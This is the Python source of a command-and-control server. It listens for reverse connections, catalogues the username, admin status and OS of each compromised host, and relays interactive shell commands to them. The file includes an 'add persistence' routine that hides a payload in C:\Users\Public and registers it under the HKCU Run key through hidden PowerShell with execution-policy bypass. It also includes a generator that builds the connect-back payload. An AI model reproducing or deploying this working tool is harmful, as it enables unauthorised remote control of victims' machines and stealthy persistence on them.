import socket
import threading
from prettytable import PrettyTable
import time
from datetime import datetime
import random
import string
import os
import shutil
import platform
import ipaddress
import netifaces as ni


def banner():
    print('███████  █████  ███    ██  ██████ ██████  ')
    print('██      ██   ██ ████   ██ ██           ██ ')
    print('███████ ███████ ██ ██  ██ ██       █████  ')
    print('     ██ ██   ██ ██  ██ ██ ██      ██      ')
    print('███████ ██   ██ ██   ████  ██████ ███████  by Sanchious')


def inbound_message(remote_target):
    print(f'[+] Awaiting response...')
    response = session_id.recv(1024).decode()
    return response


def outbound_message(remote_target, message):
    session_id.send(message.encode())


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(
        f'[*] Started listener on {host_ip} port {host_port}...\n')
    sock.listen()
    t1 = threading.Thread(target=message_handler)
    t1.start()


def message_handler():
    while True:
        if exit_flag == True:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            platform = remote_target.recv(1024).decode()
            if admin == '1':
                isAdmin = 'Yes'
            elif username == 'root':
                isAdmin = 'Yes'
            else:
                isAdmin = 'No'
            current_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_stamp = (
                f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                sessions.append(
                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp, username, isAdmin, platform])
                print(
                    f'\n[*] Connection received from {host_name[0]}@{remote_ip[0]} \nEnter command#> ', end='')
            else:
                sessions.append(
                    [remote_target, remote_ip[0], time_stamp, username, isAdmin, platform])
                print(
                    f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
        except:
            pass


def session_handler(session_id):
    while True:
        message = input('Session command#> ')
        if message == 'exit':
            outbound_message(session_id, message)
            session_id.close()
            break
        if message == 'background':
            break
        if message == 'help':
            message = ''
            print('Help menu here!')
            pass
        if message == 'add persistence':
            if sessions[num - 1][5] == 'Windows':
                payload_name = input(
                    '[*] Enter the name of the binary in current directory to be add to persistence: ')
                message = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                session_id.send(message.encode())
                response = inbound_message(session_id)
                time.sleep(1)
                if f'The system cannot find' not in response:
                    print(response)
                    message = f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /t REG_SZ /d "powershell -exec bypass -nop -w hidden C:\\Users\\Public\\{payload_name}"'
                    print(
                        f'[!] Trying to add {payload_name} as a start-up binary. Please run <remove persistence> to clean up the registry [!]')
            else:
                payload_name = input(
                    '[*] Enter the name of the python file in current directory to be add to persistence: ')
                message = f'echo "Performing persistence command for non-windows"'

        if message == 'remove persistence':
            if sessions[num - 1][5] == 'Windows':
                message = f'reg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f'
                print('[!] Trying to clean up the HKCU registry [!]')
                print(
                    f'[!] Make sure to remove the start-up binary: C:\\Users\\Public\\{payload_name} [!]')
            else:
                print('[!] Not yet implemented')
                message = ''

        if not message:
            continue
        outbound_message(session_id, message)

        response = inbound_message(session_id)
        if response == 'exit':
            print('[-] The client has terminated the session.')
            session_id.close()
            break
        print(response)


# Validate if IPv4 address is valid
def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False


# Validation if network interface is valid
def is_valid_interface(interface):
    return interface in ni.interfaces()


# Resolve IPv4 Address based on provided network interface
def resolve_ip(interface):
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    return ip


# Validate user input for either IPv4 or Network interface; Resolve Network Interface to IPv4; Return IPv4
def check_input(input_str):
    if is_valid_ipv4(input_str):
        return input_str
    elif is_valid_interface(input_str):
        resolved_ip = resolve_ip(input_str)
        return resolved_ip
    else:
        return False


# Generate a string with random lowercase ascii characters based on the length provided
def generate_random_string(length):
    characters = string.ascii_lowercase
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


# Create a python script (payload) that can be used on the target to connect back to server based on the listener IP,PORT
def generate_payload():
    name_generator = generate_random_string(6)
    # file_name = f'{name_generator}.py'
    file_name = 'payload.py'
    check_pwd = os.getcwd()
    if platform.system() == 'Windows':
        if os.path.exists(f'{check_pwd}\\client.py'):
            shutil.copy('client.py', file_name)
        else:
            print('[-] client.py file not found')
    else:
        if os.path.exists(f'{check_pwd}/client.py'):
            shutil.copy('client.py', file_name)
        else:
            print('[-] client.py file not found')

    replacements = {"INPUT_IP_HERE": host_ip,
                    "2222 # INPUT_PORT_HERE": host_port}
    with open(file_name, 'r') as file:
        file_content = file.read()
    for old_string, new_string in replacements.items():
        file_content = file_content.replace(old_string, new_string)
    with open(file_name, 'w') as f:
        f.write(file_content)

    print(
        f'Python payload for command server {host_ip}:{host_port} saved as {file_name} in current directory.')


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    banner()
    sessions = []
    listener_counter = 0
    exit_flag = False
    while True:
        try:
            command = input('Enter command#> ')
            if command == 'start listener':
                while True:
                    user_input = input(
                        "Enter an IPv4 address or a network interface name: ")
                    if check_input(user_input) is not False:
                        host_ip = check_input(user_input)
                        print(f'lhost ==> {host_ip}')
                        break
                    else:
                        print(
                            f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
                host_port = input('[*] Enter Local Port to listen on: ')
                print(f'lport ==> {host_port}')
                listener_handler()
                listener_counter += 1
            if command.split(' ')[0] == 'sessions':
                session_counter = 1
                if command.split(' ')[1] == '-l':
                    table = PrettyTable()
                    table.field_names = ['Session', 'Status', 'Username', 'Admin',
                                         'Target', 'OS Platform', 'Connection Time']
                    table.padding_width = 2
                    for target in sessions:
                        table.add_row(
                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(table)
                if command.split(' ')[1] == '-i':
                    num = int(command.split(' ')[2])
                    session_id = (sessions[num - 1])[0]
                    session_handler(session_id)
            if command == 'exit':
                exit_flag = True
                sock.close()
                break

            if command == 'generate payload':
                if listener_counter > 0:
                    generate_payload()
                else:
                    print(
                        '[-] You cannot generate a payload without an active listener.')

        except KeyboardInterrupt:
            print('\n [-] Keyboard interrupt issued.')
            exit_flag = True
            sock.close()
            break
        except Exception as e:
            print(e)
